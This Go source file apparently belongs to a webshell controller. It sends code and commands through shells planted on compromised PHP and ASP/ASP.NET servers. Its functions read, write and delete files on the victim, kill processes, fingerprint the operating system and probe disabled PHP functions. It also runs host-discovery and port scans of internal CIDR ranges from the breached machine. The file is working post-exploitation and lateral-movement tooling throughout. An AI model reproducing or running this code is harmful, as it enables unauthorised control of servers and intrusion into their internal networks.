func jsStr(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `"`, `\"`)
	s = strings.ReplaceAll(s, "\n", `\n`)
	s = strings.ReplaceAll(s, "\r", `\r`)
	return `"` + s + `"`
}

// vbsStr 生成 VBScript 双引号字符串字面量：转义反斜杠、双引号；
// 换行转为 " & vbCrLf & " 连接（VBScript 字符串字面量不支持 \n 转义）。
// 用于把命令 / 路径安全地嵌入提交给 VBScript 型 ASP 靶机的代码里。
func vbsStr(s string) string {
	// VBScript 字符串内双引号用 "" 转义，反斜杠无需转义（直接保留为字面量）。
	s = strings.ReplaceAll(s, `"`, `""`)
	s = strings.ReplaceAll(s, "\r\n", `" & vbCrLf & "`)
	s = strings.ReplaceAll(s, "\n", `" & vbCrLf & "`)
	s = strings.ReplaceAll(s, "\r", `" & vbCrLf & "`)
	return `"` + s + `"`
}

// execJSON 把一段靶机代码提交（经 Shell.Code）并解析回显为 JSON，
// 统一了原 fsExec / fsExecASP 的解析逻辑（需含 ok 字段，false 时取 error）。
func execJSON(ctx context.Context, o ExecOptions, s Shell, code string) (map[string]any, error) {
	res := s.Code(ctx, o, code)
	return parseJSONResult(res)
}

// parseJSONResult 把一次靶机回显（Result）解析为 map；要求含 ok 字段，
// ok=false 时取 error。供 execJSON 与会话模块机制共用。
func parseJSONResult(res Result) (map[string]any, error) {
	if !res.OK {
		if res.Error != "" {
			return nil, fmt.Errorf("%s", res.Error)
		}
		return nil, fmt.Errorf("靶机返回非成功状态（HTTP %d）", res.Status)
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(res.Output), &out); err != nil {
		msg := stripHTML(res.Output)
		if msg == "" {
			msg = "(空响应)"
		}
		return nil, fmt.Errorf("靶机返回无法解析为 JSON: %s", msg)
	}
	if ok, _ := out["ok"].(bool); !ok {
		if e, _ := out["error"].(string); e != "" {
			return nil, fmt.Errorf("%s", e)
		}
		return nil, fmt.Errorf("靶机操作失败")
	}
	return out, nil
}

func asStr(v any) string { s, _ := v.(string); return s }
func asBool(v any) bool  { b, _ := v.(bool); return b }
func asInt(v any) int64  { f, _ := v.(float64); return int64(f) }

// ---------- 文件管理 ----------

// FSListEntry 描述靶机目录中的一项。
type FSListEntry struct {
	Name  string `json:"name"`
	Path  string `json:"path"`
	IsDir bool   `json:"isDir"`
	Size  int64  `json:"size"`
	Mode  string `json:"mode"`
}

// FsFile 是一次文件读取的结果，内容以 base64 返回，避免二进制/特殊字符破坏标记截取。
type FsFile struct {
	Name   string `json:"name"`
	Size   int64  `json:"size"`
	Base64 string `json:"base64"`
}

// FsList 列出目录内容。
func FsList(ctx context.Context, o ExecOptions, dir string) (entries []FSListEntry, resolved string, err error) {
	s := ForType(o.Type)
	m, err := CallModule(ctx, o, s, "fs.list", map[string]any{"dir": dir})
	if err != nil {
		return nil, "", err
	}
	resolved = asStr(m["dir"])
	raw, _ := m["entries"].([]any)
	entries = make([]FSListEntry, 0, len(raw))
	for _, it := range raw {
		e, _ := it.(map[string]any)
		entries = append(entries, FSListEntry{
			Name:  asStr(e["name"]),
			Path:  asStr(e["path"]),
			IsDir: asBool(e["isDir"]),
			Size:  asInt(e["size"]),
			Mode:  asStr(e["mode"]),
		})
	}
	return entries, resolved, nil
}

// FsRead 读取文件内容，以 base64 返回。
func FsRead(ctx context.Context, o ExecOptions, path string) (FsFile, error) {
	s := ForType(o.Type)
	m, err := CallModule(ctx, o, s, "fs.read", map[string]any{"path": path})
	if err != nil {
		return FsFile{}, err
	}
	return FsFile{Name: asStr(m["name"]), Size: asInt(m["size"]), Base64: asStr(m["base64"])}, nil
}

// FsWrite 写入文件内容（b64 为 base64 编码后的数据）。
// 路径在进入靶机载荷前统一归一化分隔符（见 normalizeWinPath）。
func FsWrite(ctx context.Context, o ExecOptions, path, b64 string) error {
	s := ForType(o.Type)
	_, err := CallModule(ctx, o, s, "fs.write", map[string]any{"path": normalizeFsWritePath(path), "b64": b64})
	return err
}

// FsDelete 删除文件或（空）目录。
func FsDelete(ctx context.Context, o ExecOptions, path string) error {
	s := ForType(o.Type)
	_, err := CallModule(ctx, o, s, "fs.delete", map[string]any{"path": path})
	return err
}

// ---------- 系统 / 进程 / 端口 / 环境能力 ----------

// Monitor 读取靶机的 CPU / 内存 / 负载 / 进程等资源概览（php-eval / asp 类型）。
func Monitor(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "sys.monitor", map[string]any{})
}

// OSInfo 轻量探测靶机操作系统，用于选中靶标时快速判定系统类型，
// 统一返回归一化后的 os 标识（'windows'/'linux'/'mac'）。
//   - php-eval：直接 eval 一段自包含 PHP（php_uname('s')），不依赖靶机会话与 _hlp 缓存，
//     避免会话不可写 / 助手缓存陈旧导致模块式探测失败；失败再退回命令通道。
//   - php-cmd ：无 eval 通道，用命令通道（uname / ver）判定。
//   - asp 等 ：走会话模块（sys.info）；asp 通常由调用方直接判定为 Windows，不会走到这里。
func OSInfo(ctx context.Context, o ExecOptions) (map[string]any, error) {
	switch o.Type {
	case TypeCmd:
		return osInfoByCommand(ctx, o)
	case TypeEval:
		if m, err := osInfoByDirectPHP(ctx, o); err == nil {
			if os, _ := m["os"].(string); os != "" {
				return m, nil
			}
		}
		return osInfoByCommand(ctx, o)
	case TypeAsp, TypeAspVbs, TypeAspnet:
		// ASP / ASP.NET 靶机必为 Windows（IIS），无需经模块探测；直接归一化返回。
		return map[string]any{"ok": true, "os": "windows", "hostname": ""}, nil
	default:
		s := ForType(o.Type)
		m, err := CallModule(ctx, o, s, "sys.info", map[string]any{})
		if err != nil {
			return nil, err
		}
		// 把 php_uname() / WMI Caption 这类原始串归一到内部标识，避免前端再解析。
		if raw, ok := m["os"].(string); ok {
			m["os"] = normalizeOS(raw)
		}
		return m, nil
	}
}

// osInfoByDirectPHP 直接向 php-eval 靶机提交一段自包含 PHP（不依赖会话/助手）：
// php_uname('s') 给出系统名（Windows NT / Linux / Darwin），gethostname() 给出主机名，
// 以 0x1F 分隔后由标记包裹回显。若 php_uname 被 disable_functions 禁用而拿不到系统名，
// 返回的 os 为空串，由调用方退回命令通道。
func osInfoByDirectPHP(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	res := s.Code(ctx, o, `echo @php_uname('s')."\x1f".@gethostname();`)
	if !res.OK {
		return nil, fmt.Errorf("直接 OS 探测失败: %s", res.Error)
	}
	osName, host := res.Output, ""
	if i := strings.IndexByte(res.Output, 0x1f); i >= 0 {
		osName, host = res.Output[:i], res.Output[i+1:]
	}
	return map[string]any{"ok": true, "os": normalizeOS(osName), "hostname": strings.TrimSpace(host)}, nil
}

// osInfoByCommand 针对 php-cmd（无 eval 通道）靶机：直接跑系统命令判定操作系统。
// 先试 uname（Linux/macOS 必有），再试 ver（Windows cmd 必有）——避免 `;`/`&`
// 在 cmd 与 sh 下语义不一致（cmd 不认 `;`，sh 的 `&` 会后台化）。返回归一化 os 标识。
func osInfoByCommand(ctx context.Context, o ExecOptions) (map[string]any, error) {
	// Linux / macOS：uname -s 输出 Linux / Darwin。
	if os := normalizeOS(Execute(ctx, o.WithCommand("uname -s")).Output); os != "" {
		return map[string]any{"ok": true, "os": os}, nil
	}
	// Windows：ver 输出 "Microsoft Windows [Version ...]"。
	if os := normalizeOS(Execute(ctx, o.WithCommand("ver")).Output); os != "" {
		return map[string]any{"ok": true, "os": os}, nil
	}
	return map[string]any{"ok": true, "os": ""}, nil
}

// normalizeOS 把 php_uname() / WMI Caption / uname / ver 返回的系统串归一到内部标识。
func normalizeOS(s string) string {
	l := strings.ToLower(s)
	switch {
	case strings.Contains(l, "windows"), strings.Contains(l, "winnt"):
		return "windows"
	case strings.Contains(l, "darwin"):
		return "mac"
	case strings.Contains(l, "linux"):
		return "linux"
	}
	return ""
}

// ProcList 读取靶机进程列表（含 PPID），php-eval / asp 类型靶机支持。
func ProcList(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "proc.list", map[string]any{})
}

// ProcKill 结束靶机进程（pid 为进程号，sig 为信号，默认 15/SIGTERM，9 为 SIGKILL）。
// php-eval 走 posix_kill / kill；asp 走 taskkill（sig=9 加 /F 强杀）。
func ProcKill(ctx context.Context, o ExecOptions, pid string, sig int) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "proc.kill", map[string]any{"pid": pid, "sig": sig})
}

// PortsList 读取靶机监听端口列表（含对应 PID / 进程名），php-eval / asp 类型靶机支持。
func PortsList(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "net.ports", map[string]any{})
}

// PhpInfo 读取靶机 PHP 环境能力研判（含禁用函数、受限配置），仅 php-eval 类型靶机支持。
func PhpInfo(ctx context.Context, o ExecOptions) (map[string]any, error) {
	if o.Type == TypeAsp || o.Type == TypeAspVbs {
		return nil, fmt.Errorf("ASP 靶机非 PHP 环境，不支持 phpinfo")
	}
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "sys.phpinfo", map[string]any{})
}

// AspEnv 读取 ASP 靶机环境能力研判（COM 组件可用性等），asp / asp-vbs 类型靶机支持。
func AspEnv(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "sys.env", map[string]any{})
}

// AspNetEnv 读取 ASP.NET 靶机环境能力研判（.NET 版本 / 当前用户 / Web 服务 / 物理路径等），
// aspnet 类型靶机支持。复用会话模块机制（sys.env 模块）。
func AspNetEnv(ctx context.Context, o ExecOptions) (map[string]any, error) {
	s := ForType(o.Type)
	return CallModule(ctx, o, s, "sys.env", map[string]any{})
}

// ExpandPorts 把端口规格展开为逗号分隔的整数字符串。支持单端口 "80"、范围 "1-1000"、
// 或混合列表 "21,22,80,443"。设置单区间与总数上限，避免一次提交过多连接拖垮靶机。
func ExpandPorts(spec string) (string, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return "", fmt.Errorf("端口规格不能为空")
	}
	parts := strings.Split(spec, ",")
	out := make([]string, 0, len(parts))
	total := 0
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if strings.Contains(p, "-") {
			bounds := strings.SplitN(p, "-", 2)
			lo, err1 := strconv.Atoi(strings.TrimSpace(bounds[0]))
			hi, err2 := strconv.Atoi(strings.TrimSpace(bounds[1]))
			if err1 != nil || err2 != nil || lo < 1 || hi > 65535 || lo > hi {
				return "", fmt.Errorf("非法端口范围: %s", p)
			}
			if hi-lo+1 > 2000 {
				return "", fmt.Errorf("单区间端口数过多（上限 2000）: %s", p)
			}
			for i := lo; i <= hi; i++ {
				out = append(out, strconv.Itoa(i))
				total++
			}
		} else {
			n, err := strconv.Atoi(p)
			if err != nil || n < 1 || n > 65535 {
				return "", fmt.Errorf("非法端口: %s", p)
			}
			out = append(out, strconv.Itoa(n))
			total++
		}
		if total > 5000 {
			return "", fmt.Errorf("单次扫描端口总数过多（上限 5000）")
		}
	}
	if len(out) == 0 {
		return "", fmt.Errorf("未解析到任何端口")
	}
	return strings.Join(out, ","), nil
}

// ScanProbePorts 是内网主机存活探测用的常见端口，短超时尝试其中任意一个可连即视为在线。
// 放在完整端口扫描之前，用于快速跳过离线主机，避免对大段地址做完整端口扫描而长时间挂起。
const ScanProbePorts = "445,22,3389,80,443,8080"

// ExpandHosts 把目标规格展开为主机地址列表。支持：
//   - 单个 IP / 域名：192.168.1.1、example.com
//   - 区间：192.168.1.1-254（末段）或 192.168.1.1-192.168.1.20（完整）
//   - CIDR：192.168.1.0/24
//   - 逗号列表：混合上述任意形式
// 返回前做合法性校验与去重，并限制主机总数（上限 512）以防一次性提交过多连接。
func ExpandHosts(spec string) ([]string, error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil, fmt.Errorf("目标不能为空")
	}
	var out []string
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		var hosts []string
		var err error
		switch {
		case strings.Contains(part, "/"):
			hosts, err = cidrHosts(part)
		case strings.Contains(part, "-"):
			hosts, err = rangeHosts(part)
		default:
			hosts = []string{part}
		}
		if err != nil {
			return nil, err
		}
		out = append(out, hosts...)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("未解析出任何目标")
	}
	if len(out) > 512 {
		return nil, fmt.Errorf("目标主机数过多（上限 512），请缩小范围")
	}
	seen := make(map[string]bool, len(out))
	dedup := make([]string, 0, len(out))
	for _, h := range out {
		if !hostValid(h) {
			return nil, fmt.Errorf("非法目标: %s", h)
		}
		if !seen[h] {
			seen[h] = true
			dedup = append(dedup, h)
		}
	}
	return dedup, nil
}

// hostValid 仅允许域名 / IPv4 的字符集，拒绝 | " 空格等可能破坏模板或 JSON 的字符。
func hostValid(h string) bool {
	if h == "" {
		return false
	}
	for _, c := range h {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '.' || c == '-') {
			return false
		}
	}
	return true
}

// cidrHosts 展开 IPv4 CIDR 为地址列表，跳过网络号与广播地址（/31、/32 除外）。
func cidrHosts(cidr string) ([]string, error) {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, fmt.Errorf("非法 CIDR: %s", cidr)
	}
	ones, bits := ipnet.Mask.Size()
	if bits != 32 {
		return nil, fmt.Errorf("仅支持 IPv4 CIDR: %s", cidr)
	}
	ip := append(net.IP(nil), ipnet.IP.To4()...)
	total := 1 << uint(bits-ones)
	skip := total > 2
	n := 0
	var out []string
	for ; ipnet.Contains(ip); incIP(ip) {
		if skip && (n == 0 || n == total-1) {
			n++
			continue
		}
		out = append(out, ip.String())
		n++
	}
	return out, nil
}

// rangeHosts 展开 IPv4 区间为地址列表，支持「末段-末段」与「完整-完整」两种写法。
func rangeHosts(part string) ([]string, error) {
	bounds := strings.SplitN(part, "-", 2)
	if len(bounds) != 2 {
		return nil, fmt.Errorf("非法范围: %s", part)
	}
	start := strings.TrimSpace(bounds[0])
	end := strings.TrimSpace(bounds[1])
	if end == "" {
		return nil, fmt.Errorf("非法范围: %s", part)
	}
	if !strings.Contains(end, ".") {
		idx := strings.LastIndex(start, ".")
		if idx < 0 {
			return nil, fmt.Errorf("非法范围: %s", part)
		}
		end = start[:idx+1] + end
	}
	s4 := net.ParseIP(start).To4()
	e4 := net.ParseIP(end).To4()
	if s4 == nil || e4 == nil {
		return nil, fmt.Errorf("仅支持 IPv4 范围: %s", part)
	}
	var sval, eval uint32
	for _, b := range s4 {
		sval = sval*256 + uint32(b)
	}
	for _, b := range e4 {
		eval = eval*256 + uint32(b)
	}
	if eval < sval {
		return nil, fmt.Errorf("范围起点大于终点: %s", part)
	}
	if eval-sval+1 > 1024 {
		return nil, fmt.Errorf("范围过大（上限 1024）: %s", part)
	}
	var out []string
	for ip := append(net.IP(nil), s4...); bytes.Compare(ip, e4) <= 0; incIP(ip) {
		out = append(out, ip.String())
	}
	return out, nil
}

// incIP 把 IPv4 地址原地加 1（用于 CIDR / 区间遍历）。
func incIP(ip net.IP) {
	b := ip.To4()
	if b == nil {
		return
	}
	for i := len(b) - 1; i >= 0; i-- {
		b[i]++
		if b[i] != 0 {
			break
		}
	}
}

// HostScan 对内网多台目标主机做 TCP 端口扫描，返回每台主机的存活与开放端口。
// aspnet 走服务端缓存模块（net.hostscan，WshOpen 随 WshMod_net 编译缓存，逐主机只 Invoke）；
// php-eval / asp 类型靶机走各自内联模板（靶机侧一次性完成存活探测与端口扫描并聚合返回）。
func HostScan(ctx context.Context, o ExecOptions, hosts []string, ports string, probe string) (map[string]any, error) {
	if len(hosts) == 0 {
		return nil, fmt.Errorf("目标主机列表为空")
	}
	expanded, err := ExpandPorts(ports)
	if err != nil {
		return nil, err
	}
	s := ForType(o.Type)
	if s.Type() == TypeAspnet {
		return CallModule(ctx, o, s, "net.hostscan", map[string]any{
			"hosts": strings.Join(hosts, "|"),
			"ports": expanded,
			"probe": probe,
		})
	}
	code, err := s.HostScan(strings.Join(hosts, "|"), expanded, probe)
	if err != nil {
		return nil, err
	}
	return execJSON(ctx, o, s, code)
}

// PortScan 对目标主机做 TCP 端口扫描，返回开放端口列表。aspnet 走服务端缓存模块
// （net.scan，WshOpen 随 WshMod_net 编译一次后缓存，逐端口请求只 Invoke 缓存 Type，
// 不再每次重编 WshRunner 骨架）；php-eval / asp 类型靶机走各自内联模板。
// host 为目标地址（IP 或域名），ports 为端口规格（如 "80"、"1-1000"、"21,22,80,443"）。
func PortScan(ctx context.Context, o ExecOptions, host, ports string) (map[string]any, error) {
	host = strings.TrimSpace(host)
	if host == "" {
		return nil, fmt.Errorf("目标主机不能为空")
	}
	expanded, err := ExpandPorts(ports)
	if err != nil {
		return nil, err
	}
	s := ForType(o.Type)
	if s.Type() == TypeAspnet {
		return CallModule(ctx, o, s, "net.scan", map[string]any{"host": host, "ports": expanded})
	}
	code, err := s.PortScan(host, expanded)
	if err != nil {
		return nil, err
	}
	return execJSON(ctx, o, s, code)
}
